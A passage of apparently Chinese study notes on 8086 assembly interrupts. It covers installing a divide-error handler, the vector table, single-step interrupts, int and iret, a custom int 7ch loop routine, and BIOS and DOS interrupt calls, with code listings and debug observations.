class="line">do0:</span><br><span class="line">显示字符串“Welcome to debug”</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">do0end: nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>通过 <code>offset do0end - offset do0</code>和 <code>do0end: nop</code> 可以确定do0的长度</p><ul><li><code>-</code> 是编译器识别的运算符号，编译器可以用它来进行两个常数的减法。</li></ul><p>  比如 : mov ax,8-4  被<strong>编译器</strong>处理为指令:mov ax,4 </p><ul><li>编译器还可以处理表达式。比如指令:mov ax,(5+3)*5&#x2F;10，被编译器处理为指令:mov ax,4</li></ul></li></ul><h3 id="12-9-do0"><a href="#12-9-do0" class="headerlink" title="12.9 do0"></a>12.9 do0</h3><ul><li><p>do0的任务是显示字符串我们就直接用实验十的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment </span><br><span class="line">db &#x27;Welcome to debug&#x27;,0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line"></span><br><span class="line">mov cx,offset do0end - offset do0</span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line">设置中断向量表</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">do0:</span><br><span class="line">         mov dh,3</span><br><span class="line"> mov dl,1</span><br><span class="line">   mov cl,2</span><br><span class="line"> mov ax,data</span><br><span class="line">   mov ds,ax</span><br><span class="line"> mov si,0</span><br><span class="line"> call show_str</span><br><span class="line"></span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line"></span><br><span class="line">show_str:mov ax,cx</span><br><span class="line"> mov cl,[si]</span><br><span class="line"> mov ch,0</span><br><span class="line"> jcxz s</span><br><span class="line"> mov cx,ax</span><br><span class="line"> push dx</span><br><span class="line"> mov bx,dx</span><br><span class="line"> mov ax,0B800h</span><br><span class="line"> mov es,ax</span><br><span class="line"> mov dl,dh</span><br><span class="line"> mov dh,0</span><br><span class="line"> mov ax,0A0h</span><br><span class="line"> mul dx</span><br><span class="line">     mov bh,0</span><br><span class="line"> add ax,bx</span><br><span class="line"> add ax,bx</span><br><span class="line"> mov bx,ax</span><br><span class="line"> mov al,[si]</span><br><span class="line"> mov ah,cl</span><br><span class="line"> mov di,si</span><br><span class="line"> add di,di</span><br><span class="line"> mov es:[bx+di],ax</span><br><span class="line"> inc si</span><br><span class="line"> pop dx</span><br><span class="line"> jmp show_str</span><br><span class="line">s:   ret</span><br><span class="line"></span><br><span class="line">do0end: nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><strong>但是，这么处理是有问题的，’Welcome to debug’在程序ti.exe的data段中。程序ti.exe执行完成后返回它所占用的内存空间被系统释放，而在其中存放的’Welcome to debug’也将很可能被别的信息覆盖</strong></p><p>所以这段字符串也应该放在一段不会被覆盖的程序中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov cx,offset do0end - offset do0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">do0: jmp short do0start</span><br><span class="line"> db &#x27;Welcome to debug&#x27;,0</span><br><span class="line"> </span><br><span class="line">do0start:mov dh,3</span><br><span class="line"> mov dl,1</span><br><span class="line">   mov cl,2</span><br><span class="line"> mov ax,0020H;这里修改了数据段的段地址指向do0的段地址</span><br><span class="line">   mov ds,ax</span><br><span class="line"> mov si,2;这里设置代码段起始地址跳过前两个字节就是那个jmp</span><br><span class="line"> call show_str</span><br><span class="line"></span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line"></span><br><span class="line">show_str:mov ax,cx</span><br><span class="line"> mov cl,[si]</span><br><span class="line"> mov ch,0</span><br><span class="line"> jcxz s</span><br><span class="line"> mov cx,ax</span><br><span class="line"> push dx</span><br><span class="line"> mov bx,dx</span><br><span class="line"> mov ax,0B800h</span><br><span class="line"> mov es,ax</span><br><span class="line"> mov dl,dh</span><br><span class="line"> mov dh,0</span><br><span class="line"> mov ax,0A0h</span><br><span class="line"> mul dx</span><br><span class="line">     mov bh,0</span><br><span class="line"> add ax,bx</span><br><span class="line"> add ax,bx</span><br><span class="line"> mov bx,ax</span><br><span class="line"> mov al,[si]</span><br><span class="line"> mov ah,cl</span><br><span class="line"> mov di,si</span><br><span class="line"> add di,di</span><br><span class="line"> mov es:[bx+di],ax</span><br><span class="line"> inc si</span><br><span class="line"> pop dx</span><br><span class="line"> jmp show_str</span><br><span class="line">s:   ret</span><br><span class="line"></span><br><span class="line">do0end: nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-10-设置中断向量"><a href="#12-10-设置中断向量" class="headerlink" title="12.10 设置中断向量"></a>12.10 设置中断向量</h3><ul><li>我们将do0的入口地址0:200，写入中断向量表的0号表项中，使do0成为<br>0 号中断的中断处理程序。</li><li>0号表项的地址为0:0，其中0:0字单元存放偏移地址，0:2字单元存放段地址</li></ul><p>完整的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov cx,offset do0end - offset do0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov word ptr es:[0],200H</span><br><span class="line">mov word ptr es:[2],0</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">do0: jmp short do0start</span><br><span class="line"> db &#x27;Welcome to debug&#x27;,0</span><br><span class="line"> </span><br><span class="line">do0start:mov dh,3</span><br><span class="line"> mov dl,1</span><br><span class="line">   mov cl,2</span><br><span class="line"> mov ax,0020H</span><br><span class="line">   mov ds,ax</span><br><span class="line"> mov si,2</span><br><span class="line"> call show_str</span><br><span class="line"></span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line"></span><br><span class="line">show_str:mov ax,cx</span><br><span class="line"> mov cl,[si]</span><br><span class="line"> mov ch,0</span><br><span class="line"> jcxz s</span><br><span class="line"> mov cx,ax</span><br><span class="line"> push dx</span><br><span class="line"> mov bx,dx</span><br><span class="line"> mov ax,0B800h</span><br><span class="line"> mov es,ax</span><br><span class="line"> mov dl,dh</span><br><span class="line"> mov dh,0</span><br><span class="line"> mov ax,0A0h</span><br><span class="line"> mul dx</span><br><span class="line">     mov bh,0</span><br><span class="line"> add ax,bx</span><br><span class="line"> add ax,bx</span><br><span class="line"> mov bx,ax</span><br><span class="line"> mov al,[si]</span><br><span class="line"> mov ah,cl</span><br><span class="line"> mov di,si</span><br><span class="line"> add di,di</span><br><span class="line"> mov es:[bx+di],ax</span><br><span class="line"> inc si</span><br><span class="line"> pop dx</span><br><span class="line"> jmp show_str</span><br><span class="line">s:   ret</span><br><span class="line"></span><br><span class="line">do0end: nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>触法程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,1</span><br><span class="line">mov bx,0</span><br><span class="line">div bx</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240731233600145.png" alt="image-20240731233600145"></p><p>重启dos再运行te.exe会有效果吗</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240731234420964.png" alt="image-20240731234420964"></p><p>直接运行系统卡死</p><p>单步调试，也没有跳转到0000：0200</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240731234300060.png" alt="image-20240731234300060"></p><p>我们查看0000：0200 发现没有东西了</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240731234227184.png" alt="image-20240731234227184"></p><h3 id="12-11-单步中断"><a href="#12-11-单步中断" class="headerlink" title="12.11 单步中断"></a>12.11 单步中断</h3><ul><li><p>CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。</p></li><li><p>单步中断的中断类型码为1，则它所引发的中断过程如下:<br>(1)取得中断类型码1<br>(2)标志寄存器入栈，TF、IF设置为0<br>(3)CS、IP入栈<br>(4)<code>(IP)=(1*4),(CS)=(1*4+2)。</code></p></li><li><p>如上所述，如果TF&#x3D;1，则执行一条指令CPU就要转去执行1号中断处理程房</p></li><li><p>同样的道理，Debug提供了单步中断的中断处理程序，功能为显示所有寄存器中的内容后等待输入命令。</p></li><li><p>在使用T命令执行指令时，Debug 将TF设置为1，使得CPU在工作于单步中断方式下，则在CPU执行完这条指令后就引发单步中断，执行单步中断的中断处理程序，所有寄存器中的内容被显示在屏幕上，并且等待输入指令</p></li><li><p>总之，当TF&#x3D;1时，CPU在执行完一条指令后将引发单步中断，转去执行中断处理程序。执行完中断处理程序后，又返回原来的位置继续..</p></li><li><p>(1)取得中断类型码N<br>(2)标志寄存器入栈，TF、IF设置为0<br>(3)CS、IP入栈<br>(4)<code>(IP)=(N*4),(CS)=(N*4+2)。</code></p></li><li><p>最后，CPU提供单步中断功能的原因就是，为单步跟踪的执行过程，提供了实现机制。</p></li></ul><h3 id="12-12-响应中断的特殊情况"><a href="#12-12-响应中断的特殊情况" class="headerlink" title="12.12 响应中断的特殊情况"></a>12.12 响应中断的特殊情况</h3><ul><li><p>一般情况下，CPU在执行完当前指令后，如果检测到中断信息，就响应中断，引发中断过程。可是，在有些情况下，CPU 在执行完当前指令后，即便是发生中断，也不会响应。</p></li><li><p>例如，在执行完向ss寄存器传送数据的指令后，即便检测到中断信号，CPU也不会响应。这样做的主要原因是，ss:sp联合指向栈顶，而对它们的设置应该连续完成因为，如果在执行完设置ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器、CS和IP的值。而ss改变，sp并未改变，ss:sp指向的不是正确的栈顶，将引起错误。</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801000410097.png" alt="image-20240801000410097"></p></li></ul><h2 id="13-int指令"><a href="#13-int指令" class="headerlink" title="13 int指令"></a>13 int指令</h2><h3 id="13-1-int指令"><a href="#13-1-int指令" class="headerlink" title="13.1 int指令"></a>13.1 int指令</h3><ul><li><p>int格式:<code>int n</code>，n为中断类型码。它的功能是引发中断过程。</p></li><li><p>CPU 执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下:</p><p>(1)取得中断类型码N<br>(2)标志寄存器入栈，TF、IF设置为0<br>(3)CS、IP入栈<br>(4)<code>(IP)=(N*4),(CS)=(N*4+2)。</code></p><p>从此处转去执行n号中断的中断处理程序</p></li><li><p>可以在程序中使用int指令调用任何一个中断的中断处理程序。</p></li></ul><p><strong>例如</strong></p><p>我们先运行ti.exe再运行int 0</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801002013524.png" alt="image-20240801002013524"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801002054497.png" alt="image-20240801002054497"></p><ul><li><p>可见，int指令的最终功能和ca1l指令相似，都是调用一段程序。</p></li><li><p>因此，一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用。</p></li><li><p>我们在编程的时候，可以用int指会调用这些子程序。当然，也可以自己编写一些中断处理程序供别人使用。</p></li><li><p>以后，我们可以将中断处理程序简称为中断例程。</p></li></ul><h3 id="13-2-编写供应用程序调用的中断例程"><a href="#13-2-编写供应用程序调用的中断例程" class="headerlink" title="13.2 编写供应用程序调用的中断例程"></a>13.2 编写供应用程序调用的中断例程</h3><ul><li>前面，我们已经编写过中断0的中断例程了现在我们讨论可以供应用程序调用的中断例程的编写方法。</li></ul><p>实例一</p><p> 编写、安装中断7ch的中断例程，实现求word型数据的平方。</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801003112410.png" alt="image-20240801003112410"></p><p>注意再中断例程的最后要使用iret指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iret指令的功能用汇编语法描述为</span><br><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><ul><li><p>CPU执行int 7ch指令进入中断例程之前，标志寄存器、当前的CS和IP被压入栈中，在执行完中断例程后，应该用iret指令恢复int 7ch 执行前的标志寄存器和CS、IP的值，从而接着执行应用程序。</p></li><li><p>int指令和 iret指令的配合使用与cal1指合和ret指令的配合使用具有相似的思路。</p></li></ul><p>实例二</p><p>功能:将一个全是字母，以 0 结尾的字符串，转化为大写。</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801005251434.png" alt="image-20240801005251434"></p><ul><li>最后，在中断例程中用到了寄存器 si和cx，编写中断例程和编写子程序的时候具有同样的问题，就是要避免寄存器的冲突。应该注意例程中用到的寄存器的值的保存和恢复。</li></ul><h3 id="13-3-对int，iret和栈的深入理解"><a href="#13-3-对int，iret和栈的深入理解" class="headerlink" title="13.3 对int，iret和栈的深入理解"></a>13.3 对int，iret和栈的深入理解</h3><ul><li><p>问题：用7ch中断例程完成 1oop指令的功能。</p></li><li><p>loop s的执行需要两个信息，循环次数和到s的位移，所以，7ch中断例程要完成loop指令的功能，也需要这两个信息作为参数。我们用cx存放循环次数，用bx存放位移。</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801192824122.png" alt="image-20240801192824122"></p></li><li><p>分析，为了模拟loop指令，7ch中断例程应具备下面的功能:</p><ul><li>(1)dec cx</li><li>(2)如果(cx)≠0，转到标号s处执行，否则向下执行。</li></ul></li><li><p>7ch中断例程如何实现到目的地址的转移</p><ul><li>(1)转到标号s显然应设(CS)&#x3D;标号s的段地址，(IP)&#x3D;标号s的偏移地址;</li><li>(2)那么，中断例程如何得到标号s的段地址和偏移地址呢?</li><li>(3)现在知道，可以从栈中直接和间接地得到标号s的段地址和偏移地址，那么如何用它们设置CS:IP呢?</li></ul></li><li><p>int 7ch引发中断过程后，进入 7ch 中断例程，在中断过程中，当前的标志寄存器、CS和IP都要压栈:</p></li><li><p>此时压入的CS和IP中的内容，分别是调用程序的段地址(可以认为是标号s的段地址)和int 7ch后一条指令的偏移地址(即标号se的偏移地址)。</p></li><li><p>可以利用iret指令，我们将栈中的se的偏移地址加上 bx 中的转移位移，则栈中的se的偏移地址就变为了s的偏移地址。（mov bx,offset s-offset se 可以知道bx是表示的负数）</p></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801195447471.png" alt="image-20240801195447471"></p><p>我们先编写好程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov cx,offset do0end - offset do0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov word ptr es:[7ch*4],200H</span><br><span class="line">mov word ptr es:[7ch*4+2],0</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">do0:</span><br><span class="line">lp:push bp</span><br><span class="line">mov bp,sp</span><br><span class="line">dec cx</span><br><span class="line">jcxz lpret</span><br><span class="line">add [bp+2],bx</span><br><span class="line">lpret:  pop bp</span><br><span class="line">iret</span><br><span class="line"></span><br><span class="line">do0end: nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:  mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,160*12</span><br><span class="line">mov bx,offset s-offset se</span><br><span class="line">mov cx,80</span><br><span class="line">s:  mov byte ptr es:[di],&#x27;!&#x27;</span><br><span class="line">add di,2</span><br><span class="line">int 7ch</span><br><span class="line">se:nop</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>再单步调试</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801195359092.png" alt="image-20240801195359092"></p><p>注意执行标号s时的ip为E</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801195710223.png" alt="image-20240801195710223"></p><p>我们发现成功修改ip值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">只要在[...]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801195923255.png" alt="image-20240801195923255"></p><p>成功跳转到标号s</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801195953840.png" alt="image-20240801195953840"></p><p>运行程序，成功显示<code>！</code></p><h3 id="13-4-BIOS和DOS所提供的中断例程"><a href="#13-4-BIOS和DOS所提供的中断例程" class="headerlink" title="13.4 BIOS和DOS所提供的中断例程"></a>13.4 BIOS和DOS所提供的中断例程</h3><ul><li><p>在系统板的ROM中存放着一套程序，称为BIOS(基本输入输出系统)，BIOS中主要包含以下几部分内容。<br>(1)硬件系统的检测和初始化程序;<br>(2)外部中断(第15 章中进行讲解)和内部中断的中断例程:<br>(3)用于对硬件设备进行 I&#x2F;O操作的中断例程;<br>(4)其他和硬件系统相关的中断例程。</p></li><li><p>操作系统DOS也提供了中断例程，从操作系统的角度来看，DOS的中断例程就是操作系统向程序员提供的编程资源。</p></li><li><p>BIOS和DOS在所提供的中断例程中包含了许多子程序，这些子程序实现了程序员在编程的时候经常需要用到的功能。程序员在编程的时候，可以用int指令直接调用BIOS和 DOS 提供的中断例程，来完成某些工作。</p></li><li><p>和硬件设备相关的 DOS中断例程中，一般都调用了BIOS的中断例程。</p></li></ul><h3 id="13-5-BIOS和DOS中断例程的安装过程"><a href="#13-5-BIOS和DOS中断例程的安装过程" class="headerlink" title="13.5 BIOS和DOS中断例程的安装过程"></a>13.5 BIOS和DOS中断例程的安装过程</h3><ul><li><p>(1)开机后，CPU一加电，初始化(CS)&#x3D;0FFFFH，(IP)&#x3D;0，自动从FFFF:0单元开始执行程序。FFFF:0处有一条转跳指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序。</p></li><li><p>(2)初始化程序将建立BIOS 所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中。</p></li><li><p>(3)硬件系统检测和初始化完成后，调用int 19h进行操作系统的引导。从此将计算机交由操作系统控制。</p></li><li><p>(4)DOS 启动后，除完成其它工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量。</p></li></ul><h3 id="13-6-BIOS中断例程的应用"><a href="#13-6-BIOS中断例程的应用" class="headerlink" title="13.6 BIOS中断例程的应用"></a>13.6 BIOS中断例程的应用</h3><p>通过举例子来了解BIOS中断例程的应用</p><ul><li><p>int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏慕输出相关的子程序。</p></li><li><p>一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪个子程序。</p></li><li><p>BIOS 和DOS 提供的中断例程，都用<strong>ah</strong>来传递内部子程序的编号</p></li><li><p>我们看一下int 10h中断例程的设置光标位置功能。</p></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801202531632.png" alt="image-20240801202531632"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bh中页号的含义:内存地址空间中，B8000h~BFFFFh共 32K的空间，为80*25 彩色字符模式的显示缓冲区。</span><br><span class="line">一屏的内容在显示缓冲区中共占4000个字节，</span><br><span class="line">也就是说，通常情况下，B8000~B8F9F中的4000个字节的内容将出现在显示器上。</span><br><span class="line">一般情况下，显示第0页的内容。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240801203037506.png" alt="image-20240801203037506"></p><p><strong>实验</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802100031894.png" alt="image-20240802100031894"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802100043638.png" alt="image-20240802100043638"></p><p>我们发现输入数据的地方出现在中间</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240802100249831.png" alt="image-20240802100249831"></p><p>输入数据也是直接覆盖</p><p>debug调试</p><p>我们发现在执行int 10h的第一条指令就发生了跳转</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802100506923.png" alt="image-20240802100506923"></p><p>并且执行一条指令后就退出了</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802100715597.png" alt="image-20240802100715597"></p><p>查看地址里面也只有三条指令</p><p><strong>实验2</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802101036530.png" alt="image-20240802101036530"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802101054015.png" alt="image-20240802101054015"></p><p>debug调试</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802101240601.png" alt="image-20240802101240601"></p><h3 id="13-7-DOS中断例程的应用"><a href="#13-7-DOS中断例程的应用" class="headerlink" title="13.7 DOS中断例程的应用"></a>13.7 DOS中断例程的应用</h3><ul><li><p>int 21h 中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。</p></li><li><p>我们从前一直使用的是 int 21h中断例程的4ch号功能，即程序返回功能，如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch    ;程序返回</span><br><span class="line">mov al,0      ;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><ul><li><p>(ah)&#x3D;4ch表示调用第21h号中断例程的4ch号子程序，功能为程序返回，可以提供返回值作为参数。<br>我们前面使用这个功能的时候经常写作:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure></li></ul></li><li><p>int 21h中断例程的在光标位置显示字符串的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 